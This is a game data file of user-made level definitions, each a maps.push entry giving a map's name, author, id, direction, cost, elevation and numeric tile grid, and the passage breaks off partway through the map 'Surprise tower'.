maps.push({name="Trigger Tower 15",author="FL00D",id="#1667033033",direction="left",cost=366,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,0,0,0,0,1,24,140,140,140,140,19,1,5,5,5,5,5,5,5,5,0,0,0,0,1,24,140,140,140,140,19,1,140,140,140,140,5,5,5,5,0,0,0,0,97,24,140,140,140,140,19,1,140,140,140,140,5,1,5,5,0,0,0,0,1,24,140,140,140,140,19,1,140,140,140,140,5,1,5,5,0,0,0,0,1,24,19,19,19,19,19,1,140,140,140,140,5,1,5,5,0,0,2,24,24,24,1,140,140,140,140,14,9,9,9,9,9,1,5,5,0,0,2,24,24,24,1,140,140,140,140,14,140,140,140,140,9,1,5,5,0,0,0,0,24,24,1,140,140,140,140,14,140,140,140,140,9,1,5,5,0,0,0,0,24,24,1,140,140,140,140,14,140,140,140,140,9,1,5,5,0,0,0,0,24,24,1,14,14,14,14,14,140,140,140,140,9,1,5,5,0,0,0,0,24,24,1,1,1,1,1,1,1,1,1,1,1,1,5,5,0,0,0,0,24,24,3,5,5,5,5,96,5,5,5,5,5,5,5,5,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Crossing",author="FL00D",id="#1667033571",direction="forward",cost=239,elevation=0,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,92,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,0,1,0,0,0,0,0,0,0,1,11,11,1,66,66,1,135,135,1,0,92,1,0,0,0,0,0,0,0,1,9,9,9,9,9,96,9,9,9,9,9,9,9,0,0,0,0,0,0,1,9,9,9,9,9,96,9,9,9,9,9,9,97,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="Crowded Rooms 5",author="FL00D",id="#1667033757",direction="left",cost=126,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,1,1,54,1,0,0,0,0,0,0,0,0,34,34,34,54,54,54,1,0,0,0,34,0,0,0,0,0,0,0,0,0,34,0,0,1,54,54,1,0,0,0,34,0,0,0,0,0,0,0,1,1,54,1,0,1,54,1,1,0,1,1,54,1,0,2,14,14,14,14,54,54,54,1,0,0,34,0,0,0,1,54,54,1,0,2,14,14,14,14,54,54,54,1,0,0,34,0,0,0,1,54,54,1,0,0,0,0,0,0,1,1,1,1,0,1,54,1,1,0,1,1,54,1,0,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,1,54,54,1,0,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,1,1,54,1,0,1,1,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,54,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="The Pit",author="iszaar",id="#1667057262",direction="forward",cost=241,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,55,55,35,35,35,35,0,0,0,0,0,0,0,0,0,0,35,35,35,35,55,55,35,35,35,35,0,0,0,0,0,0,0,0,0,35,35,34,35,35,115,115,35,35,34,35,35,0,0,0,0,0,0,0,0,35,35,34,35,1,16,16,1,35,34,35,35,0,0,0,0,0,0,0,35,35,35,35,35,24,0,0,24,35,35,35,35,35,0,0,0,0,0,0,35,35,35,35,16,67,0,0,67,16,35,35,35,35,0,0,0,1,1,1,55,35,35,16,0,0,42,42,0,0,16,35,35,55,1,1,1,1,44,92,35,94,35,21,0,42,42,100,42,0,21,35,94,35,92,44,1,1,44,92,35,35,35,21,0,42,93,42,42,0,21,35,35,35,92,44,1,1,1,1,55,35,35,16,0,0,42,42,0,0,16,35,35,55,1,1,1,0,0,0,35,35,35,35,16,67,0,0,67,16,35,35,35,35,0,0,0,0,0,0,35,35,35,35,35,24,0,0,24,35,35,35,35,35,0,0,0,0,0,0,0,35,35,34,35,1,16,16,1,35,34,35,35,0,0,0,0,0,0,0,0,35,35,34,35,35,115,115,35,35,34,35,35,0,0,0,0,0,0,0,0,0,35,35,35,35,55,55,35,35,35,35,0,0,0,0,0,0,0,0,0,0,35,35,35,35,55,55,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE distractions",author="Luffaren",id="#1667131436",direction="right",cost=198,elevation=0,map=[0,1,9,2,2,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,91,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,90,8,8,90,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,7,7,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,7,7,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,7,7,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,90,8,8,90,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,90,9,9,9,9,9,9,91,9,9,9,9,9,9,9,1,1,0,0,9,9,9,9,9,9,90,9,9,9,9,9,90,9,9,91,9,9,0,0,9,9,9,91,9,9,1,9,9,9,9,91,9,9,9,91,9,2,0,0,0,9,9,9,9,9,9,9,9,90,9,9,9,9,9,91,9,2,0,0,0,9,90,9,9,9,9,91,9,9,9,9,9,90,9,91,9,9,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE straight upward",author="Luffaren",id="#1667131507",direction="forward",cost=50,elevation=3,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,10,10,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="RACE wide bump",author="Luffaren",id="#1667131535",direction="left",cost=200,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,29,2,2,29,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,29,29,29,29,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,29,29,29,29,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,29,29,29,29,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,29,29,29,29,31,31,31,31,31,31,31,0,0,0,0,0,0,0,0,31,29,29,29,29,31,29,29,29,29,29,29,31,31,0,0,0,0,0,0,31,29,29,29,29,31,2,29,29,29,29,29,29,29,31,0,0,0,0,0,31,29,29,29,29,31,2,29,29,29,29,29,29,29,29,31,0,0,0,0,0,30,30,30,30,0,29,29,29,29,29,29,29,29,29,31,0,0,0,0,0,27,27,27,27,0,31,31,31,31,31,31,29,29,29,31,0,0,0,0,1,28,28,28,28,1,0,0,0,0,0,31,29,29,29,31,0,0,0,0,0,29,29,29,29,0,0,0,0,0,0,1,29,29,29,1,0,0,0,0,0,29,29,29,29,0,0,0,0,0,0,0,29,29,29,0,0,0,0,0,0,29,29,29,29,0,0,0,0,0,0,0,29,29,29,0,0,0,0,0,0,29,29,29,29,0,0,0,0,0,0,0,29,29,29,29,0,0,0,0,29,29,29,29,29,0,0,0,0,0,0,0,29,29,29,29,29,29,29,29,29,29,29,29,29,0,0,0,0,0,0,0,29,29,29,29,29,29,29,29,29,29,29,29,29,0,0,0,0,0,0,0,0,29,29,29,29,29,29,29,29,29,29,29,0,0,0,0,0,0,0,0,0,0,0,29,29,29,29,29,29,29,0,0,0,0]});
maps.push({name="RACE snake drop",author="Luffaren",id="#1667131827",direction="forward",cost=161,elevation=-19,map=[24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,90,5,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,90,0,0,0,5,5,0,0,0,0,0,0,0,90,5,5,5,5,5,5,5,5,0,0,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,1,5,5,1,0,0,0,90,5,5,5,5,5,5,0,0,90,5,5,90,5,5,5,5,5,5,5,5,5,5,5,5,90,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,90,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,90,5,0,0,0,0,0,0,0,0,5,5,5,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5]});
maps.push({name="RACE swirl loop",author="Luffaren",id="#1667214168",direction="left",cost=139,elevation=9,map=[0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,2,14,14,14,14,185,185,185,185,14,14,14,14,14,0,0,0,0,0,0,2,14,14,14,14,185,185,185,185,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0]});
maps.push({name="RACE bumping uglies",author="Luffaren",id="#1667216155",direction="right",cost=195,elevation=-4,map=[9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0,9,9,9,9,9,8,7,6,5,5,185,185,185,185,185,185,185,185,90,5,9,9,9,9,9,8,7,6,5,5,185,185,185,185,185,185,185,185,5,2,0,9,9,9,9,8,7,6,5,5,185,185,185,185,185,185,185,185,5,2,0,0,9,9,9,8,7,6,5,5,185,185,185,185,185,185,185,185,90,5,0,0,1,1,1,0,0,0,0,1,14,14,14,14,14,14,14,14,1,0]});
maps.push({name="Dam Siege",author="Soft Serve",id="#1667279122",direction="forward",cost=582,elevation=0,map=[67,15,1,2,2,1,5,5,5,5,5,5,5,5,5,5,5,5,5,67,67,15,1,23,23,1,5,65,65,65,65,65,65,5,5,23,23,5,5,67,67,15,1,23,23,1,5,65,65,97,24,65,65,5,5,128,23,5,5,67,67,15,24,23,23,24,5,65,65,24,24,65,65,5,24,23,23,24,5,67,67,15,15,23,23,5,5,65,65,93,94,65,65,5,5,23,23,5,5,67,67,15,141,23,23,141,5,65,65,65,65,65,65,5,141,23,23,141,5,67,67,15,141,23,23,141,5,65,65,65,65,65,65,5,141,23,23,141,5,67,67,15,15,23,23,5,5,65,5,5,5,5,65,5,5,23,23,5,5,67,67,15,24,23,23,24,5,65,141,141,141,141,65,5,24,23,23,24,5,67,67,15,15,23,87,23,23,57,23,23,23,23,57,23,23,87,23,5,5,67,67,15,15,23,87,23,23,57,23,23,23,23,57,23,23,87,23,5,5,67,67,15,24,23,23,24,15,66,141,141,141,141,66,15,24,23,23,24,5,67,67,15,15,23,23,15,15,66,15,15,15,15,66,15,15,23,23,5,5,67,67,15,141,23,23,141,15,66,66,66,66,66,66,15,141,23,23,141,5,67,67,15,141,23,23,141,15,66,66,66,66,66,66,15,141,23,23,141,5,67,67,15,15,23,23,15,15,66,66,94,93,66,66,15,15,23,23,5,5,67,67,15,24,23,23,24,15,66,66,24,24,66,66,15,24,23,23,24,5,67,67,15,15,23,129,15,15,66,66,24,97,66,66,15,1,23,23,1,5,67,67,15,15,23,23,15,15,66,66,66,66,66,66,15,1,96,96,1,5,67,67,15,15,15,15,15,15,15,15,15,15,15,15,15,1,2,2,1,5,67]});
maps.push({name="Around the keep",author="Luffaren",id="#1667463781",direction="right",cost=265,elevation=5,map=[0,0,0,0,1,1,1,0,0,0,189,189,189,189,189,189,14,2,2,19,0,0,0,0,1,1,1,0,0,0,28,28,30,30,32,32,14,14,14,19,0,0,0,0,1,1,90,5,6,6,185,185,185,185,185,185,48,48,93,19,0,0,0,0,0,1,5,5,6,6,185,185,185,185,185,185,48,94,48,19,0,0,0,0,0,1,89,90,5,0,0,0,67,0,0,0,1,14,14,19,0,0,0,0,0,1,5,5,5,0,0,67,6,67,0,0,0,15,15,19,0,0,0,0,0,1,5,5,5,0,0,0,67,0,0,0,0,16,16,19,0,0,0,0,0,1,90,5,5,5,0,0,0,0,0,0,0,17,17,19,0,0,0,0,0,1,19,19,89,5,0,0,67,0,67,67,1,119,118,1,0,0,0,0,0,1,90,19,185,185,19,39,19,39,19,19,1,96,1,1,0,0,0,0,0,1,1,18,5,5,5,0,67,0,19,89,1,143,90,90,0,0,0,0,0,0,1,17,90,5,5,5,0,0,19,19,119,119,119,119,0,0,0,0,0,0,1,16,16,89,5,5,5,0,0,19,1,97,119,2,0,0,0,0,0,0,1,1,15,15,90,5,5,5,0,67,1,90,119,2,0,0,0,0,0,0,0,1,1,14,14,89,5,5,5,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,13,13,90,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,12,12,89,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,1,1,12,11,10,9,89,5,90,5,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,9,8,7,6,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1]});
maps.push({name="Speedo slide",author="Luffaren",id="#1667473279",direction="right",cost=526,elevation=4,map=[0,0,2,2,0,0,0,0,0,199,90,14,14,14,9998,14,14,94,18,90,0,1,160,160,1,0,0,0,0,199,14,14,89,14,15,16,17,18,18,2,0,0,160,160,0,0,0,0,0,199,14,14,14,14,15,16,17,18,18,2,0,0,160,160,0,0,0,0,0,199,14,14,14,14,9998,14,14,93,18,90,0,160,160,160,160,0,0,0,0,1,141,141,141,1,199,199,0,0,141,0,0,160,160,160,160,0,0,0,67,24,5,5,5,24,67,0,0,0,0,0,0,160,160,160,160,0,0,0,0,67,0,0,0,67,0,0,0,0,0,0,0,160,160,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,42,0,0,160,160,160,160,0,0,0,0,0,158,158,158,0,0,0,0,93,41,94,0,158,160,160,160,0,0,67,0,0,159,159,159,0,0,0,0,67,21,67,0,0,160,160,160,0,67,162,67,0,159,159,159,0,0,0,0,67,21,67,0,0,160,160,160,0,0,67,0,0,159,159,159,0,0,0,0,94,41,93,0,160,160,160,160,0,0,0,0,0,159,159,159,0,0,0,0,0,0,0,0,160,160,160,160,0,0,0,0,0,159,159,159,0,0,0,0,0,0,0,0,160,160,160,160,162,162,162,162,162,162,159,159,0,0,0,0,0,0,0,0,160,160,162,162,162,162,162,162,162,162,159,159,0,0,0,0,0,158,0,189,160,162,162,162,162,162,162,162,162,162,159,159,0,189,0,0,0,159,0,18,162,162,162,162,162,162,162,162,162,162,162,158,0,21,162,162,162,159,1,18,162,162,162,162,162,162,162,162,162,162,162,158,0,21,162,162,162,159,1,145,18,0,0,0,0,0,0,0,0,0,0,0,0,188,0,0,0,21,186]});
maps.push({name="Trigger gauntlet",author="Luffaren",id="#1667477700",direction="right",cost=258,elevation=8,map=[12,2,2,12,0,0,0,0,29,29,29,0,0,0,0,0,128,29,145,0,12,12,12,12,0,0,0,0,0,0,9,0,187,44,148,0,38,0,187,44,12,12,12,12,0,0,0,0,0,0,27,0,187,44,148,0,38,0,187,44,11,9998,12,0,0,0,0,0,0,0,27,0,187,44,148,0,38,0,187,44,10,12,12,0,0,0,0,0,0,0,27,0,0,0,0,0,38,0,0,0,9,89,12,0,0,0,0,27,27,9,27,0,187,44,148,0,38,0,187,44,9,12,12,0,0,0,0,27,0,34,186,0,187,44,148,0,38,0,187,44,9,12,12,0,0,0,0,27,0,125,0,0,187,44,148,0,38,0,187,44,9,12,12,0,0,0,0,27,0,0,0,0,0,0,0,0,38,0,0,0,9,12,89,0,0,0,0,27,0,125,0,125,187,44,148,0,38,0,187,44,9,12,12,0,0,0,0,9,187,39,27,9,187,44,148,0,38,0,187,44,9,13,13,0,0,0,0,27,27,27,27,0,187,44,148,0,38,0,187,44,9,14,14,0,0,0,0,0,44,44,44,0,0,0,0,0,18,0,0,0,0,15,15,0,5,153,0,67,44,93,44,67,0,0,0,0,0,0,0,157,0,15,90,0,145,0,0,67,44,100,44,67,0,0,0,0,41,0,0,156,9,15,15,0,9,154,0,0,93,44,93,0,0,0,0,0,20,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,20,20,20,89,20,90,0,15,89,15,90,15,15,16,17,18,19,20,90,20,20,20,20,20,20,2,9,15,15,15,15,15,15,16,17,18,19,20,20,20,20,20,20,20,20,2,9,94,9,94,9,94,9,9,9,9,9,9,9,141,20,20,20,89,20,90]});
maps.push({name="The ceiling is lava",author="Luffaren",id="#1667480448",direction="forward",cost=240,elevation=-12,map=[0,19,19,2,2,19,19,0,0,0,0,0,0,0,1,1,1,1,1,1,0,19,19,19,19,19,19,0,0,0,0,0,0,0,1,5,132,132,5,1,0,67,0,19,19,0,67,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,6,6,9,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,7,7,9,1,0,0,67,19,19,67,0,0,0,0,0,0,0,0,1,9998,8,8,9998,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,9,9,9,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,86,9,86,1,0,0,67,19,19,67,0,0,0,0,0,0,0,0,1,7,9,9,9,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,9,86,9,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,86,9,9,1,0,0,67,19,19,67,0,0,0,0,0,0,0,0,1,86,9,9,7,1,0,0,0,39,39,0,0,0,0,0,0,0,0,0,1,9,9,86,9,1,0,0,0,39,39,0,0,0,0,0,0,10,153,0,1,9,9,9,86,1,0,67,0,19,19,0,67,0,0,0,156,145,157,0,1,7,9,9,9,1,0,1,1,95,95,1,1,0,0,0,0,19,154,0,1,9,9,86,9,1,1,1,89,119,119,89,1,1,0,0,0,0,0,0,1,86,9,9,86,1,0,1,119,119,119,119,1,0,0,0,0,0,0,0,1,9,7,7,9,1,0,1,90,131,131,90,1,0,0,0,0,0,0,0,1,90,7,7,90,1,0,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,2,2,1,1]});
maps.push({name="Im trippin out maaan",author="Luffaren",id="#1667482572",direction="forward",cost=276,elevation=0,map=[0,0,0,0,0,24,5,5,5,2,2,5,5,5,24,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,0,152,5,152,0,5,0,152,5,0,0,0,0,0,0,0,0,0,0,5,152,0,5,5,5,5,152,0,5,0,0,0,0,0,0,0,0,0,24,5,5,5,5,152,0,5,5,5,5,24,0,0,0,0,0,0,0,0,0,5,152,0,5,0,152,5,152,0,5,0,0,0,0,0,0,0,0,0,0,5,0,152,5,5,5,5,0,152,5,0,0,0,0,0,0,0,0,0,24,5,5,5,5,0,152,5,5,5,5,24,0,0,0,0,0,0,0,0,0,5,0,152,5,152,0,5,0,152,5,0,0,0,0,0,0,0,0,0,0,5,152,0,5,5,5,5,152,0,5,0,0,0,0,0,0,0,0,0,24,5,5,5,5,152,0,5,5,5,5,24,0,0,0,0,0,0,0,0,0,5,152,0,5,0,152,5,152,0,5,0,0,0,0,0,0,0,0,0,0,5,0,152,5,5,5,5,0,152,5,0,0,0,0,0,0,0,0,0,24,5,5,5,5,0,152,5,5,5,5,24,0,0,0,0,0,0,0,0,0,5,0,152,5,152,0,5,0,152,5,0,0,0,0,0,0,0,0,0,0,5,152,0,5,5,5,5,152,0,5,0,0,0,0,0,0,0,0,0,24,5,5,5,5,152,0,5,5,5,5,24,0,0,0,0,0,0,0,0,0,5,152,0,5,0,152,5,152,0,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,24,5,5,5,2,2,5,5,5,24,0,0,0,0,0]});
maps.push({name="Temporary bridge",author="Luffaren",id="#1667484537",direction="right",cost=365,elevation=10,map=[97,24,93,0,0,0,90,2,2,90,9,9,9,0,0,0,0,0,0,0,24,72,24,0,0,9,9,9,9,9,162,162,162,67,0,0,0,0,0,0,24,72,24,24,9,9,9,9,162,162,162,162,162,67,0,0,0,0,0,0,24,74,74,74,67,162,162,162,162,162,162,162,162,67,0,0,0,0,0,0,24,71,24,24,9,9,9,9,9,9,162,162,162,67,0,0,0,0,0,0,24,24,94,0,9,9,9,9,9,9,9,9,162,67,0,0,0,0,0,0,141,0,0,0,9,9,9,9,9,9,9,9,9,0,67,67,67,67,67,67,0,0,19,19,9998,9998,9998,9998,9998,9998,9998,9998,9998,19,19,19,19,19,19,19,0,89,19,20,35,195,35,195,35,195,35,195,35,19,19,89,19,19,19,2,0,19,19,19,9998,9998,9998,9998,9998,9998,9998,9998,9998,19,19,19,19,19,19,2,0,18,18,18,9,9,9,9,9,9,9,9,9,9,93,19,19,90,19,19,0,17,17,17,9,9,9,9,9,9,89,9,9,9,9,19,19,19,0,0,0,16,16,16,9,9,89,9,9,9,9,9,9,9,19,19,19,0,0,0,0,15,15,15,9,9,9,9,9,9,9,9,9,19,19,19,0,0,0,189,0,14,14,14,94,9,9,9998,9,9,9,9,98,9,3,19,0,0,0,24,0,14,14,14,13,12,11,10,9,89,9,9,9,19,19,19,0,0,0,100,0,89,14,14,13,12,11,10,9,9,9,9,0,0,0,0,0,0,0,0,0,1,89,14,13,12,11,10,9,9,9,0,0,0,0,0,0,0,0,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0]});
maps.push({name="Surprise tower",author="Luffaren",id="#1667486193",direction="forward",cost=223,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,77,0,0,0,0,0,0,0,0,0,145,145,145,0,0,0,0,77,5,5,77,0,0,0,0,0,0,0,0,0,39,39,39,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,39,93,93,93,39,184,184,184,184,184,184,184,184,184,5,0,0,0,0,0,188,39,39,39,188,94,1,1,1,105,105,1,1,1,5,0,0,0,0,0,0,145,145,145,0,5,1,7,6,5,5,89,19,119,185,39,145,0,0,0,0,0,0,0,0,94,1,7,90,65,65,5,18,1,185,39,145,0,0,0,0,0,0,0,0,5,1,8,5,65,65,5,17,1,5,0,0,0,0,0,0,0,0,0,0,94,1,9,5,65,65,5,16,1,185,40,145